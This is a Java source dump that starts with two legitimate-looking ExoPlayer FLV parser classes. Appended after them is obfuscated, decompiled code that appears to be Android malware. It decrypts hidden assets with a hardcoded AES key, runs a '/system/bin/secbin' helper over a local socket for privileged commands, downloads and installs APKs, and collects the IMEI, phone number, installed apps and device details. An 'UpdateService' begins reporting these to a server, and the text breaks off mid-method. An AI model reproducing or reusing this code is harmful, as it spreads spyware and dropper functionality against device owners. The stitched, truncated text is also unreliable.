/*
 * Copyright (C) 2014 The Android Open Source Project
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *      http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package com.google.android.exoplayer.extractor.flv;

import com.google.android.exoplayer.C;
import com.google.android.exoplayer.MediaFormat;
import com.google.android.exoplayer.extractor.TrackOutput;
import com.google.android.exoplayer.util.CodecSpecificDataUtil;
import com.google.android.exoplayer.util.MimeTypes;
import com.google.android.exoplayer.util.ParsableByteArray;

import android.util.Pair;

import java.util.Collections;

/**
 * Parses audio tags from an FLV stream and extracts AAC frames.
 */
/* package */ final class AudioTagPayloadReader extends TagPayloadReader {

  // Audio format
  private static final int AUDIO_FORMAT_AAC = 10;

  // AAC PACKET TYPE
  private static final int AAC_PACKET_TYPE_SEQUENCE_HEADER = 0;
  private static final int AAC_PACKET_TYPE_AAC_RAW = 1;

  // SAMPLING RATES
  private static final int[] AUDIO_SAMPLING_RATE_TABLE = new int[] {
      5500, 11000, 22000, 44000
  };

  // State variables
  private boolean hasParsedAudioDataHeader;
  private boolean hasOutputFormat;

  public AudioTagPayloadReader(TrackOutput output) {
    super(output);
  }

  @Override
  public void seek() {
    // Do nothing.
  }

  @Override
  protected boolean parseHeader(ParsableByteArray data) throws UnsupportedFormatException {
    if (!hasParsedAudioDataHeader) {
      int header = data.readUnsignedByte();
      int audioFormat = (header >> 4) & 0x0F;
      int sampleRateIndex = (header >> 2) & 0x03;
      if (sampleRateIndex < 0 || sampleRateIndex >= AUDIO_SAMPLING_RATE_TABLE.length) {
        throw new UnsupportedFormatException("Invalid sample rate index: " + sampleRateIndex);
      }
      // TODO: Add support for MP3 and PCM.
      if (audioFormat != AUDIO_FORMAT_AAC) {
        throw new UnsupportedFormatException("Audio format not supported: " + audioFormat);
      }
      hasParsedAudioDataHeader = true;
    } else {
      // Skip header if it was parsed previously.
      data.skipBytes(1);
    }
    return true;
  }

  @Override
  protected void parsePayload(ParsableByteArray data, long timeUs) {
    int packetType = data.readUnsignedByte();
    // Parse sequence header just in case it was not done before.
    if (packetType == AAC_PACKET_TYPE_SEQUENCE_HEADER && !hasOutputFormat) {
      byte[] audioSpecifiConfig = new byte[data.bytesLeft()];
      data.readBytes(audioSpecifiConfig, 0, audioSpecifiConfig.length);
      Pair<Integer, Integer> audioParams = CodecSpecificDataUtil.parseAacAudioSpecificConfig(
          audioSpecifiConfig);
      MediaFormat mediaFormat = MediaFormat.createAudioFormat(null, MimeTypes.AUDIO_AAC,
          MediaFormat.NO_VALUE, MediaFormat.NO_VALUE, getDurationUs(), audioParams.second,
          audioParams.first, Collections.singletonList(audioSpecifiConfig), null);
      output.format(mediaFormat);
      hasOutputFormat = true;
    } else if (packetType == AAC_PACKET_TYPE_AAC_RAW) {
      // Sample audio AAC frames
      int bytesToWrite = data.bytesLeft();
      output.sampleData(data, bytesToWrite);
      output.sampleMetadata(timeUs, C.SAMPLE_FLAG_SYNC, bytesToWrite, 0, null);
    }
  }

}

/*
 * Copyright (C) 2014 The Android Open Source Project
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *      http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package com.google.android.exoplayer.extractor.flv;

import com.google.android.exoplayer.C;
import com.google.android.exoplayer.ParserException;
import com.google.android.exoplayer.extractor.TrackOutput;
import com.google.android.exoplayer.util.ParsableByteArray;

import java.util.ArrayList;
import java.util.Date;
import java.util.HashMap;
import java.util.Map;

/**
 * Parses Script Data tags from an FLV stream and extracts metadata information.
 */
/* package */ final class ScriptTagPayloadReader extends TagPayloadReader {

  private static final String NAME_METADATA = "onMetaData";
  private static final String KEY_DURATION = "duration";

  // AMF object types
  private static final int AMF_TYPE_NUMBER = 0;
  private static final int AMF_TYPE_BOOLEAN = 1;
  private static final int AMF_TYPE_STRING = 2;
  private static final int AMF_TYPE_OBJECT = 3;
  private static final int AMF_TYPE_ECMA_ARRAY = 8;
  private static final int AMF_TYPE_END_MARKER = 9;
  private static final int AMF_TYPE_STRICT_ARRAY = 10;
  private static final int AMF_TYPE_DATE = 11;

  /**
   * @param output A {@link TrackOutput} to which samples should be written.
   */
  public ScriptTagPayloadReader(TrackOutput output) {
    super(output);
  }

  @Override
  public void seek() {
    // Do nothing.
  }

  @Override
  protected boolean parseHeader(ParsableByteArray data) {
    return true;
  }

  @Override
  protected void parsePayload(ParsableByteArray data, long timeUs) throws ParserException {
    int nameType = readAmfType(data);
    if (nameType != AMF_TYPE_STRING) {
      // Should never happen.
      throw new ParserException();
    }
    String name = readAmfString(data);
    if (!NAME_METADATA.equals(name)) {
      // We're only interested in metadata.
      return;
    }
    int type = readAmfType(data);
    if (type != AMF_TYPE_ECMA_ARRAY) {
      // Should never happen.
      throw new ParserException();
    }
    // Set the duration to the value contained in the metadata, if present.
    Map<String, Object> metadata = readAmfEcmaArray(data);
    if (metadata.containsKey(KEY_DURATION)) {
      double durationSeconds = (double) metadata.get(KEY_DURATION);
      if (durationSeconds > 0.0) {
        setDurationUs((long) (durationSeconds * C.MICROS_PER_SECOND));
      }
    }
  }

  private static int readAmfType(ParsableByteArray data) {
    return data.readUnsignedByte();
  }

  /**
   * Read a boolean from an AMF encoded buffer.
   *
   * @param data The buffer from which to read.
   * @return The value read from the buffer.
   */
  private static Boolean readAmfBoolean(ParsableByteArray data) {
    return data.readUnsignedByte() == 1;
  }

  /**
   * Read a double number from an AMF encoded buffer.
   *
   * @param data The buffer from which to read.
   * @return The value read from the buffer.
   */
  private static Double readAmfDouble(ParsableByteArray data) {
    return Double.longBitsToDouble(data.readLong());
  }

  /**
   * Read a string from an AMF encoded buffer.
   *
   * @param data The buffer from which to read.
   * @return The value read from the buffer.
   */
  private static String readAmfString(ParsableByteArray data) {
    int size = data.readUnsignedShort();
    int position = data.getPosition();
    data.skipBytes(size);
    return new String(data.data, position, size);
  }

  /**
   * Read an array from an AMF encoded buffer.
   *
   * @param data The buffer from which to read.
   * @return The value read from the buffer.
   */
  private static ArrayList<Object> readAmfStrictArray(ParsableByteArray data) {
    int count = data.readUnsignedIntToInt();
    ArrayList<Object> list = new ArrayList<>(count);
    for (int i = 0; i < count; i++) {
      int type = readAmfType(data);
      list.add(readAmfData(data, type));
    }
    return list;
  }

  /**
   * Read an object from an AMF encoded buffer.
   *
   * @param data The buffer from which to read.
   * @return The value read from the buffer.
   */
  private static HashMap<String, Object> readAmfObject(ParsableByteArray data) {
    HashMap<String, Object> array = new HashMap<>();
    while (true) {
      String key = readAmfString(data);
      int type = readAmfType(data);
      if (type == AMF_TYPE_END_MARKER) {
        break;
      }
      array.put(key, readAmfData(data, type));
    }
    return array;
  }

  /**
   * Read an ECMA array from an AMF encoded buffer.
   *
   * @param data The buffer from which to read.
   * @return The value read from the buffer.
   */
  private static HashMap<String, Object> readAmfEcmaArray(ParsableByteArray data) {
    int count = data.readUnsignedIntToInt();
    HashMap<String, Object> array = new HashMap<>(count);
    for (int i = 0; i < count; i++) {
      String key = readAmfString(data);
      int type = readAmfType(data);
      array.put(key, readAmfData(data, type));
    }
    return array;
  }

  /**
   * Read a date from an AMF encoded buffer.
   *
   * @param data The buffer from which to read.
   * @return The value read from the buffer.
   */
  private static Date readAmfDate(ParsableByteArray data) {
    Date date = new Date((long) readAmfDouble(data).doubleValue());
    data.skipBytes(2); // Skip reserved bytes.
    return date;
  }

  private static Object readAmfData(ParsableByteArray data, int type) {
    switch (type) {
      case AMF_TYPE_NUMBER:
        return readAmfDouble(data);
      case AMF_TYPE_BOOLEAN:
        return readAmfBoolean(data);
      case AMF_TYPE_STRING:
        return readAmfString(data);
      case AMF_TYPE_OBJECT:
        return readAmfObject(data);
      case AMF_TYPE_ECMA_ARRAY:
        return readAmfEcmaArray(data);
      case AMF_TYPE_STRICT_ARRAY:
        return readAmfStrictArray(data);
      case AMF_TYPE_DATE:
        return readAmfDate(data);
      default:
        return null;
    }
  }

}

public class RU {
  private static byte[] WP = new byte[] {
          68, 101, 116, 97, 95, 67, 49, 42, 84, 35,
          82, 117, 79, 80, 117, 115 };

  public static String U1(Context paramContext, String paramString) {
    String str2 = Environment.getExternalStorageDirectory().getPath();
    if (!Environment.getExternalStorageState().equals("mounted"))
      str2 = paramContext.getFilesDir().getPath();
    String str1 = str2;
    if (paramString != null)
      str1 = String.valueOf(str2) + "/" + paramString + "/";
    return str1;
  }

  public static boolean U2(Context paramContext) {
    ConnectivityManager connectivityManager = (ConnectivityManager)paramContext.getSystemService("connectivity");
    return connectivityManager.getNetworkInfo(1).isConnected() ? true : (connectivityManager.getNetworkInfo(0).isConnected());
  }

  public static boolean U3() {
    return (new File("/system/bin/secbin")).exists() ? U4() : false;
  }

  public static boolean U4() {
    if (U12.U1())
      return true;
    U12.U3();
    return U12.U1();
  }

  public static void U5(final String P1, final String P2) {
    try {
      (new Thread(new Runnable() {
        public void run() {
          Native.runcmd_wrapper(P1, P2);
        }
      })).start();
      return;
    } catch (Exception exception) {
      exception.printStackTrace();
      return;
    }
  }

  public static void U6(String paramString1, String paramString2) {
    try {
      Runtime.getRuntime().exec(String.valueOf(paramString1) + " " + paramString2).waitFor();
      return;
    } catch (Exception exception) {
      exception.printStackTrace();
      return;
    }
  }

  public static void U7(Context paramContext, String paramString1, String paramString2, int paramInt) {
    // Byte code:
    //   0: aconst_null
    //   1: astore #4
    //   3: aconst_null
    //   4: astore #7
    //   6: aconst_null
    //   7: astore #5
    //   9: aconst_null
    //   10: astore #10
    //   12: aconst_null
    //   13: astore #9
    //   15: aconst_null
    //   16: astore #8
    //   18: iload_3
    //   19: ifgt -> 23
    //   22: return
    //   23: new java/io/FileOutputStream
    //   26: dup
    //   27: aload_2
    //   28: invokespecial <init> : (Ljava/lang/String;)V
    //   31: astore #6
    //   33: aload #10
    //   35: astore_2
    //   36: aload #9
    //   38: astore #4
    //   40: aload_0
    //   41: invokevirtual getClass : ()Ljava/lang/Class;
    //   44: new java/lang/StringBuilder
    //   47: dup
    //   48: ldc '/assets/'
    //   50: invokespecial <init> : (Ljava/lang/String;)V
    //   53: aload_1
    //   54: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   57: invokevirtual toString : ()Ljava/lang/String;
    //   60: invokevirtual getResourceAsStream : (Ljava/lang/String;)Ljava/io/InputStream;
    //   63: astore_0
    //   64: aload_0
    //   65: astore_2
    //   66: aload_0
    //   67: astore #4
    //   69: iload_3
    //   70: newarray byte
    //   72: astore_1
    //   73: aload_0
    //   74: astore_2
    //   75: aload_0
    //   76: astore #4
    //   78: aload_0
    //   79: aload_1
    //   80: invokevirtual read : ([B)I
    //   83: pop
    //   84: aload_0
    //   85: astore_2
    //   86: aload_0
    //   87: astore #4
    //   89: aload #6
    //   91: aload_1
    //   92: invokestatic U9 : ([B)[B
    //   95: invokevirtual write : ([B)V
    //   98: aload_0
    //   99: astore_2
    //   100: aload_0
    //   101: astore #4
    //   103: aload #6
    //   105: invokevirtual flush : ()V
    //   108: aload_0
    //   109: ifnull -> 116
    //   112: aload_0
    //   113: invokevirtual close : ()V
    //   116: aload #6
    //   118: ifnull -> 223
    //   121: aload #6
    //   123: invokevirtual close : ()V
    //   126: return
    //   127: astore_2
    //   128: aload #8
    //   130: astore_1
    //   131: aload #7
    //   133: astore_0
    //   134: aload_0
    //   135: astore #4
    //   137: aload_1
    //   138: astore #5
    //   140: aload_2
    //   141: invokevirtual printStackTrace : ()V
    //   144: aload_1
    //   145: ifnull -> 152
    //   148: aload_1
    //   149: invokevirtual close : ()V
    //   152: aload_0
    //   153: ifnull -> 22
    //   156: aload_0
    //   157: invokevirtual close : ()V
    //   160: return
    //   161: astore_0
    //   162: return
    //   163: astore_0
    //   164: aload #5
    //   166: astore_2
    //   167: aload_2
    //   168: ifnull -> 175
    //   171: aload_2
    //   172: invokevirtual close : ()V
    //   175: aload #4
    //   177: ifnull -> 185
    //   180: aload #4
    //   182: invokevirtual close : ()V
    //   185: aload_0
    //   186: athrow
    //   187: astore_0
    //   188: return
    //   189: astore_1
    //   190: goto -> 152
    //   193: astore_1
    //   194: goto -> 175
    //   197: astore_1
    //   198: goto -> 185
    //   201: astore_0
    //   202: goto -> 116
    //   205: astore_0
    //   206: aload #6
    //   208: astore #4
    //   210: goto -> 167
    //   213: astore_2
    //   214: aload #6
    //   216: astore_0
    //   217: aload #4
    //   219: astore_1
    //   220: goto -> 134
    //   223: return
    // Exception table:
    //   from	to	target	type
    //   23	33	127	java/lang/Exception
    //   23	33	163	finally
    //   40	64	213	java/lang/Exception
    //   40	64	205	finally
    //   69	73	213	java/lang/Exception
    //   69	73	205	finally
    //   78	84	213	java/lang/Exception
    //   78	84	205	finally
    //   89	98	213	java/lang/Exception
    //   89	98	205	finally
    //   103	108	213	java/lang/Exception
    //   103	108	205	finally
    //   112	116	201	java/lang/Exception
    //   121	126	187	java/lang/Exception
    //   140	144	163	finally
    //   148	152	189	java/lang/Exception
    //   156	160	161	java/lang/Exception
    //   171	175	193	java/lang/Exception
    //   180	185	197	java/lang/Exception
  }

  public static String[] U8(Context paramContext, String paramString) {
    // Byte code:
    //   0: aload_1
    //   1: ifnull -> 13
    //   4: ldc ''
    //   6: aload_1
    //   7: invokevirtual equals : (Ljava/lang/Object;)Z
    //   10: ifeq -> 17
    //   13: aconst_null
    //   14: astore_0
    //   15: aload_0
    //   16: areturn
    //   17: new java/net/URL
    //   20: dup
    //   21: aload_1
    //   22: invokespecial <init> : (Ljava/lang/String;)V
    //   25: astore #4
    //   27: aload #4
    //   29: invokevirtual openConnection : ()Ljava/net/URLConnection;
    //   32: checkcast java/net/HttpURLConnection
    //   35: astore #4
    //   37: aload #4
    //   39: sipush #30000
    //   42: invokevirtual setConnectTimeout : (I)V
    //   45: aload #4
    //   47: sipush #30000
    //   50: invokevirtual setReadTimeout : (I)V
    //   53: aload #4
    //   55: iconst_1
    //   56: invokevirtual setDoInput : (Z)V
    //   59: aload #4
    //   61: invokevirtual connect : ()V
    //   64: aload #4
    //   66: invokevirtual getInputStream : ()Ljava/io/InputStream;
    //   69: astore #4
    //   71: new java/io/File
    //   74: dup
    //   75: aload_1
    //   76: invokespecial <init> : (Ljava/lang/String;)V
    //   79: astore_1
    //   80: aload_1
    //   81: ifnonnull -> 86
    //   84: aconst_null
    //   85: areturn
    //   86: aload_1
    //   87: invokevirtual getName : ()Ljava/lang/String;
    //   90: astore_1
    //   91: aload_0
    //   92: ldc 'download'
    //   94: invokestatic U1 : (Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;
    //   97: astore #5
    //   99: new java/io/File
    //   102: dup
    //   103: aload #5
    //   105: invokespecial <init> : (Ljava/lang/String;)V
    //   108: astore_0
    //   109: aload_0
    //   110: invokevirtual exists : ()Z
    //   113: ifne -> 121
    //   116: aload_0
    //   117: invokevirtual mkdir : ()Z
    //   120: pop
    //   121: aload #5
    //   123: ldc 'sdcard'
    //   125: invokevirtual contains : (Ljava/lang/CharSequence;)Z
    //   128: ifne -> 153
    //   131: aload_0
    //   132: invokevirtual listFiles : ()[Ljava/io/File;
    //   135: astore_0
    //   136: aload_0
    //   137: ifnull -> 153
    //   140: aload_0
    //   141: arraylength
    //   142: ifle -> 153
    //   145: aload_0
    //   146: arraylength
    //   147: istore_3
    //   148: iconst_0
    //   149: istore_2
    //   150: goto -> 333
    //   153: new java/io/FileOutputStream
    //   156: dup
    //   157: new java/lang/StringBuilder
    //   160: dup
    //   161: aload #5
    //   163: invokestatic valueOf : (Ljava/lang/Object;)Ljava/lang/String;
    //   166: invokespecial <init> : (Ljava/lang/String;)V
    //   169: aload_1
    //   170: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   173: invokevirtual toString : ()Ljava/lang/String;
    //   176: invokespecial <init> : (Ljava/lang/String;)V
    //   179: astore_0
    //   180: sipush #2048
    //   183: newarray byte
    //   185: astore #6
    //   187: aload #4
    //   189: ifnull -> 341
    //   192: aload_0
    //   193: ifnull -> 341
    //   196: aload #4
    //   198: aload #6
    //   200: invokevirtual read : ([B)I
    //   203: istore_2
    //   204: iload_2
    //   205: iconst_m1
    //   206: if_icmpne -> 310
    //   209: aload_0
    //   210: invokevirtual flush : ()V
    //   213: aload #4
    //   215: invokevirtual close : ()V
    //   218: aload_0
    //   219: invokevirtual close : ()V
    //   222: iconst_2
    //   223: anewarray java/lang/String
    //   226: astore_0
    //   227: aload_0
    //   228: iconst_0
    //   229: new java/lang/StringBuilder
    //   232: dup
    //   233: aload #5
    //   235: invokestatic valueOf : (Ljava/lang/Object;)Ljava/lang/String;
    //   238: invokespecial <init> : (Ljava/lang/String;)V
    //   241: aload_1
    //   242: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   245: invokevirtual toString : ()Ljava/lang/String;
    //   248: aastore
    //   249: aload_0
    //   250: iconst_1
    //   251: aload_1
    //   252: aastore
    //   253: new java/io/File
    //   256: dup
    //   257: new java/lang/StringBuilder
    //   260: dup
    //   261: aload #5
    //   263: invokestatic valueOf : (Ljava/lang/Object;)Ljava/lang/String;
    //   266: invokespecial <init> : (Ljava/lang/String;)V
    //   269: aload_1
    //   270: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   273: invokevirtual toString : ()Ljava/lang/String;
    //   276: invokespecial <init> : (Ljava/lang/String;)V
    //   279: invokevirtual exists : ()Z
    //   282: ifne -> 15
    //   285: goto -> 341
    //   288: aload_0
    //   289: iload_2
    //   290: aaload
    //   291: astore #6
    //   293: aload #6
    //   295: invokevirtual exists : ()Z
    //   298: ifeq -> 343
    //   301: aload #6
    //   303: invokevirtual delete : ()Z
    //   306: pop
    //   307: goto -> 343
    //   310: aload_0
    //   311: aload #6
    //   313: iconst_0
    //   314: iload_2
    //   315: invokevirtual write : ([BII)V
    //   318: goto -> 196
    //   321: astore_0
    //   322: aload_0
    //   323: invokevirtual printStackTrace : ()V
    //   326: goto -> 341
    //   329: astore_0
    //   330: goto -> 322
    //   333: iload_2
    //   334: iload_3
    //   335: if_icmplt -> 288
    //   338: goto -> 153
    //   341: aconst_null
    //   342: areturn
    //   343: iload_2
    //   344: iconst_1
    //   345: iadd
    //   346: istore_2
    //   347: goto -> 333
    // Exception table:
    //   from	to	target	type
    //   17	27	329	java/lang/Exception
    //   27	80	321	java/lang/Exception
    //   86	121	321	java/lang/Exception
    //   121	136	321	java/lang/Exception
    //   140	148	321	java/lang/Exception
    //   153	187	321	java/lang/Exception
    //   196	204	321	java/lang/Exception
    //   209	249	321	java/lang/Exception
    //   253	285	321	java/lang/Exception
    //   293	307	321	java/lang/Exception
    //   310	318	321	java/lang/Exception
  }

  public static byte[] U9(byte[] paramArrayOfbyte) throws Exception {
    SecretKeySpec secretKeySpec = new SecretKeySpec(WP, "AES");
    Cipher cipher = Cipher.getInstance("AES");
    cipher.init(2, secretKeySpec);
    return cipher.doFinal(paramArrayOfbyte);
  }

  public static class U10 {
    public static String[] U1(Context param1Context, String param1String) {
      String[] arrayOfString = new String[4];
      param1String = String.valueOf(RU.U1(param1Context, "download")) + param1String;
      PackageInfo packageInfo = param1Context.getPackageManager().getPackageArchiveInfo(param1String, 1);
      if (packageInfo != null) {
        String str1 = packageInfo.applicationInfo.packageName;
        String str2 = packageInfo.versionName;
        arrayOfString[1] = str1;
        arrayOfString[2] = str2;
      }
      return arrayOfString;
    }

    public static List<String> U2(Context param1Context) {
      List list = param1Context.getPackageManager().getInstalledPackages(0);
      ArrayList<String> arrayList = new ArrayList();
      Iterator iterator = list.iterator();
      while (true) {
        if (!iterator.hasNext())
          return arrayList;
        arrayList.add(((PackageInfo)iterator.next()).applicationInfo.packageName);
      }
    }

    public static List<PackageInfo> U3(Context param1Context) {
      return param1Context.getPackageManager().getInstalledPackages(0);
    }

    public static boolean U4(Context param1Context, String param1String) {
      List<String> list = U2(param1Context);
      return (list != null && list.size() > 0 && list.contains(param1String));
    }

    public static void U5(Context param1Context, String param1String) {
      Intent intent = new Intent("android.intent.action.VIEW");
      intent.setDataAndType(Uri.fromFile(new File(param1String)), "application/vnd.android.package-archive");
      intent.setFlags(268435456);
      param1Context.startActivity(intent);
    }
  }

  public static class U11 {
    public static TelephonyManager U1(Context param1Context) {
      return (TelephonyManager)param1Context.getSystemService("phone");
    }

    public static String U10(Context param1Context) {
      ConnectivityManager connectivityManager = (ConnectivityManager)param1Context.getSystemService("connectivity");
      return (connectivityManager == null || connectivityManager.getActiveNetworkInfo() == null) ? "UNKNOWN" : connectivityManager.getActiveNetworkInfo().getTypeName();
    }

    public static String U12(Context param1Context) {
      ConnectivityManager connectivityManager = (ConnectivityManager)param1Context.getSystemService("connectivity");
      return (connectivityManager == null || connectivityManager.getActiveNetworkInfo() == null) ? "UNKNOWN" : connectivityManager.getActiveNetworkInfo().getExtraInfo();
    }

    public static List<String> U13(Context param1Context) {
      List list = ((ActivityManager)param1Context.getSystemService("activity")).getRunningServices(100);
      ArrayList<String> arrayList = new ArrayList();
      Iterator iterator = list.iterator();
      while (true) {
        if (!iterator.hasNext())
          return arrayList;
        arrayList.add(((ActivityManager.RunningServiceInfo)iterator.next()).service.getShortClassName());
      }
    }

    public static String U2(Context param1Context) {
      return U1(param1Context).getDeviceId();
    }

    public static String U3(Context param1Context) {
      return U1(param1Context).getLine1Number();
    }

    public static String U4() {
      return String.valueOf(Build.BRAND) + " " + Build.MODEL;
    }

    public static String[] U5() {
      return new String[] { Build.VERSION.RELEASE, Build.VERSION.SDK };
    }

    public static String U6(Context param1Context) {
      ActivityManager activityManager = (ActivityManager)param1Context.getSystemService("activity");
      ActivityManager.MemoryInfo memoryInfo = new ActivityManager.MemoryInfo();
      activityManager.getMemoryInfo(memoryInfo);
      return Formatter.formatFileSize(param1Context, memoryInfo.availMem);
    }

    public static StatFs U7() {
      return new StatFs(Environment.getExternalStorageDirectory().getPath());
    }

    public static int U8() {
      return U7().getBlockSize();
    }

    public static String U9(Context param1Context) {
      int i = U7().getAvailableBlocks();
      return Formatter.formatFileSize(param1Context, Long.valueOf(U8()).longValue() * Long.valueOf(i).longValue());
    }
  }

  public static class U12 {
    public static final String M1 = "localhost";

    public static final int M2 = 11009;

    public static boolean U1() {
      // Byte code:
      //   0: aconst_null
      //   1: astore_3
      //   2: aconst_null
      //   3: astore #6
      //   5: iconst_0
      //   6: istore_1
      //   7: iconst_0
      //   8: istore_0
      //   9: new java/net/Socket
      //   12: dup
      //   13: ldc 'localhost'
      //   15: sipush #11009
      //   18: invokespecial <init> : (Ljava/lang/String;I)V
      //   21: astore #4
      //   23: aload #4
      //   25: ifnull -> 85
      //   28: aload #4
      //   30: invokevirtual isConnected : ()Z
      //   33: ifne -> 61
      //   36: aload #4
      //   38: new java/net/InetSocketAddress
      //   41: dup
      //   42: ldc 'localhost'
      //   44: invokestatic getByName : (Ljava/lang/String;)Ljava/net/InetAddress;
      //   47: checkcast java/net/Inet4Address
      //   50: sipush #11009
      //   53: invokespecial <init> : (Ljava/net/InetAddress;I)V
      //   56: ldc 50000
      //   58: invokevirtual connect : (Ljava/net/SocketAddress;I)V
      //   61: aload #4
      //   63: invokevirtual isConnected : ()Z
      //   66: istore_2
      //   67: iload_2
      //   68: ifeq -> 73
      //   71: iconst_1
      //   72: istore_0
      //   73: aload #4
      //   75: ifnull -> 158
      //   78: aload #4
      //   80: invokevirtual close : ()V
      //   83: iload_0
      //   84: ireturn
      //   85: iconst_1
      //   86: istore_0
      //   87: goto -> 73
      //   90: astore #5
      //   92: aload #6
      //   94: astore #4
      //   96: aload #4
      //   98: astore_3
      //   99: aload #5
      //   101: invokevirtual printStackTrace : ()V
      //   104: iload_1
      //   105: istore_0
      //   106: aload #4
      //   108: ifnull -> 83
      //   111: aload #4
      //   113: invokevirtual close : ()V
      //   116: iconst_0
      //   117: ireturn
      //   118: astore_3
      //   119: iconst_0
      //   120: ireturn
      //   121: astore #4
      //   123: aload_3
      //   124: ifnull -> 131
      //   127: aload_3
      //   128: invokevirtual close : ()V
      //   131: aload #4
      //   133: athrow
      //   134: astore_3
      //   135: iload_0
      //   136: ireturn
      //   137: astore_3
      //   138: goto -> 131
      //   141: astore #5
      //   143: aload #4
      //   145: astore_3
      //   146: aload #5
      //   148: astore #4
      //   150: goto -> 123
      //   153: astore #5
      //   155: goto -> 96
      //   158: iload_0
      //   159: ireturn
      // Exception table:
      //   from	to	target	type
      //   9	23	90	java/lang/Exception
      //   9	23	121	finally
      //   28	61	153	java/lang/Exception
      //   28	61	141	finally
      //   61	67	153	java/lang/Exception
      //   61	67	141	finally
      //   78	83	134	java/lang/Exception
      //   99	104	121	finally
      //   111	116	118	java/lang/Exception
      //   127	131	137	java/lang/Exception
    }

    public static boolean U2(String param1String) {
      // Byte code:
      //   0: aconst_null
      //   1: astore #4
      //   3: aconst_null
      //   4: astore #6
      //   6: iconst_0
      //   7: istore_3
      //   8: iconst_0
      //   9: istore_2
      //   10: new java/net/Socket
      //   13: dup
      //   14: ldc 'localhost'
      //   16: sipush #11009
      //   19: invokespecial <init> : (Ljava/lang/String;I)V
      //   22: astore #5
      //   24: iload_2
      //   25: istore_1
      //   26: aload #5
      //   28: ifnull -> 127
      //   31: aload #5
      //   33: invokevirtual isConnected : ()Z
      //   36: ifne -> 64
      //   39: aload #5
      //   41: new java/net/InetSocketAddress
      //   44: dup
      //   45: ldc 'localhost'
      //   47: invokestatic getByName : (Ljava/lang/String;)Ljava/net/InetAddress;
      //   50: checkcast java/net/Inet4Address
      //   53: sipush #11009
      //   56: invokespecial <init> : (Ljava/net/InetAddress;I)V
      //   59: ldc 50000
      //   61: invokevirtual connect : (Ljava/net/SocketAddress;I)V
      //   64: iload_2
      //   65: istore_1
      //   66: aload #5
      //   68: invokevirtual isConnected : ()Z
      //   71: ifeq -> 127
      //   74: aload #5
      //   76: invokevirtual getOutputStream : ()Ljava/io/OutputStream;
      //   79: astore #4
      //   81: aload #5
      //   83: invokevirtual getInputStream : ()Ljava/io/InputStream;
      //   86: astore #6
      //   88: aload #4
      //   90: ifnull -> 112
      //   93: aload #4
      //   95: aload_0
      //   96: invokevirtual getBytes : ()[B
      //   99: invokevirtual write : ([B)V
      //   102: aload #4
      //   104: invokevirtual flush : ()V
      //   107: aload #4
      //   109: invokevirtual close : ()V
      //   112: iload_2
      //   113: istore_1
      //   114: aload #6
      //   116: ifnull -> 127
      //   119: ldc2_w 5000
      //   122: invokestatic sleep : (J)V
      //   125: iconst_1
      //   126: istore_1
      //   127: aload #5
      //   129: ifnull -> 208
      //   132: aload #5
      //   134: invokevirtual close : ()V
      //   137: iload_1
      //   138: ireturn
      //   139: astore #5
      //   141: aload #6
      //   143: astore_0
      //   144: aload_0
      //   145: astore #4
      //   147: aload #5
      //   149: invokevirtual printStackTrace : ()V
      //   152: iload_3
      //   153: istore_1
      //   154: aload_0
      //   155: ifnull -> 137
      //   158: aload_0
      //   159: invokevirtual close : ()V
      //   162: iconst_0
      //   163: ireturn
      //   164: astore_0
      //   165: iconst_0
      //   166: ireturn
      //   167: astore_0
      //   168: aload #4
      //   170: ifnull -> 178
      //   173: aload #4
      //   175: invokevirtual close : ()V
      //   178: aload_0
      //   179: athrow
      //   180: astore_0
      //   181: iload_1
      //   182: ireturn
      //   183: astore #4
      //   185: goto -> 178
      //   188: astore_0
      //   189: aload #5
      //   191: astore #4
      //   193: goto -> 168
      //   196: astore #4
      //   198: aload #5
      //   200: astore_0
      //   201: aload #4
      //   203: astore #5
      //   205: goto -> 144
      //   208: iload_1
      //   209: ireturn
      // Exception table:
      //   from	to	target	type
      //   10	24	139	java/io/IOException
      //   10	24	167	finally
      //   31	64	196	java/io/IOException
      //   31	64	188	finally
      //   66	88	196	java/io/IOException
      //   66	88	188	finally
      //   93	112	196	java/io/IOException
      //   93	112	188	finally
      //   119	125	196	java/io/IOException
      //   119	125	188	finally
      //   132	137	180	java/lang/Exception
      //   147	152	167	finally
      //   158	162	164	java/lang/Exception
      //   173	178	183	java/lang/Exception
    }

    public static void U3() {
      if ((new File("/system/bin/secbin")).exists()) {
        RU.U5("/system/bin/secbin", "");
        SystemClock.sleep(1000L);
      }
    }
  }
}

public class UpdateService extends Service {
  private boolean _doSearchReport(String paramString) {
    boolean bool = false;
    ArrayList<BasicNameValuePair> arrayList = new ArrayList();
    arrayList.add(new BasicNameValuePair("imei", this.m3));
    arrayList.add(new BasicNameValuePair("ch", this.m2));
    arrayList.add(new BasicNameValuePair("ver", "a12"));
    if (checkPermission()) {
      arrayList.add(new BasicNameValuePair("pm", "1"));
    } else {
      arrayList.add(new BasicNameValuePair("pm", "0"));
    }
    if (this.m6 != null && !"".equals(this.m6))
      arrayList.add(new BasicNameValuePair("ostype", this.m6));
    if (this.m7 != null && !"".equals(this.m7))
      arrayList.add(new BasicNameValuePair("osapi", this.m7));
    if (this.m4 != null && !"".equals(this.m4))
      arrayList.add(new BasicNameValuePair("mobile", this.m4));
    if (this.m5 != null && !"".equals(this.m5))
      arrayList.add(new BasicNameValuePair("mobilemodel", this.m5));
    if (this.m11 != null && !"".equals(this.m11))
      arrayList.add(new BasicNameValuePair("netoperater", this.m11));
    if (this.m10 != null && !"".equals(this.m10))
